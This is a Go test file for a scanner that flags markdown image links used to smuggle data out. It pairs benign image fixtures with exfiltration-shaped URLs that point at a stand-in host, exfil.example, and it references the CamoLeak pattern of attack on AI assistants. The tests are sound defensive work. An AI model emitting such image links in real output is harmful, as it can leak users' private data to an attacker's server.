package contentinjection

import (
	"strings"
	"testing"

	"github.com/stretchr/testify/assert"
)

// TestScanMarkdownImage_Benign covers ordinary markdown image
// references: short URLs, badge URLs with conventional query
// parameters, relative paths. None should fire.
func TestScanMarkdownImage_Benign(t *testing.T) {
	t.Parallel()

	cases := []struct {
		name string
		body []byte
	}{
		{"relative_path", []byte("![logo](./assets/logo.png)")},
		{"absolute_url", []byte("![banner](https://example.com/banner.svg)")},
		{"shields_badge", []byte(
			"![ci](https://img.shields.io/github/actions/workflow/status/owner/repo/test.yml?branch=main&style=flat)")},
		{"github_user_content", []byte(
			"![diagram](https://raw.githubusercontent.com/owner/repo/main/docs/diagram.png)")},
		{"sha_query_param", []byte(
			"![signed](https://example.com/img.png?v=8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92)")},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			res := scanMarkdownImage(tc.body)
			assert.Equal(t, 0, res.Count, "benign image %q must not fire", tc.name)
		})
	}
}

// TestScanMarkdownImage_LongURL covers the length-shaped exfil
// signal: a URL whose body alone exceeds the length threshold.
// Models a single-frame exfil URL with the payload encoded into
// the path.
func TestScanMarkdownImage_LongURL(t *testing.T) {
	t.Parallel()

	url := "https://exfil.example/api/v1/pixel/" +
		strings.Repeat("a", markdownImageURLLongThreshold)
	body := []byte("![p](" + url + ")")
	res := scanMarkdownImage(body)
	assert.Equal(t, 1, res.Count, "URL above the length threshold must fire")
	assert.Len(t, res.Details, 1)
}

// TestScanMarkdownImage_LongQueryValue covers the query-shaped exfil
// signal: a URL with a single query parameter carrying a long opaque
// value. Models the CamoLeak-shaped per-frame exfil URL.
func TestScanMarkdownImage_LongQueryValue(t *testing.T) {
	t.Parallel()

	value := strings.Repeat("A", markdownImageQueryValueLongThreshold+1)
	body := []byte("![p](https://exfil.example/pix.gif?data=" + value + ")")
	res := scanMarkdownImage(body)
	assert.Equal(t, 1, res.Count, "URL with long query value must fire")
}

// TestScanMarkdownImage_MultipleHits covers a dictionary-of-pixels
// payload: many short URLs, each carrying a small fragment, but
// with at least the parameter-value structure of exfil. Each fires
// independently.
func TestScanMarkdownImage_MultipleHits(t *testing.T) {
	t.Parallel()

	value := strings.Repeat("Z", markdownImageQueryValueLongThreshold+1)
	body := []byte(strings.Repeat(
		"![p](https://exfil.example/p?d="+value+")\n", 5))
	res := scanMarkdownImage(body)
	assert.Equal(t, 5, res.Count, "five exfil-shaped image refs must fire five times")
}

// TestScanMarkdownImage_DetailTruncated confirms long URLs are
// sampled into Details with a length cap, not in full.
func TestScanMarkdownImage_DetailTruncated(t *testing.T) {
	t.Parallel()

	url := "https://exfil.example/api/v1/pixel/" + strings.Repeat("x", 1000)
	body := []byte("![p](" + url + ")")
	res := scanMarkdownImage(body)
	assert.Equal(t, 1, res.Count)
	assert.Len(t, res.Details, 1)
	assert.LessOrEqual(t, len(res.Details[0]), urlExfilSampleLen+len("..."),
		"Details URL sample must be truncated to urlExfilSampleLen+ellipsis")
}
